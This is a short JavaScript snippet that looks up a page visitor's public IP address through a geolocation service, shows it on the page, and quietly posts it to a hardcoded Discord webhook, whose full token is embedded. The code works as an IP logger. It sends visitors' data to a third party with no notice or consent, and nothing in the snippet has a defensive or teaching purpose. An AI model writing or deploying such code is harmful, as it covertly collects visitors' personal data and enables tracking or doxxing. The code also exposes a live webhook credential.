const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB";

fetch("https://api.techniknews.net/ipgeo/?format=json")
    .then(response => response.json())
    .then(json => {
        const ip = json.ip;
        document.getElementById("IP").innerHTML = ip;

        const msg = {
            "content": `ip - ${ip}`
        };

        return fetch(whurl + "?wait=true", {
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "body": JSON.stringify(msg)
        });
    })
    .then(response => response.json())
    .then(console.log)
    .catch(console.error);
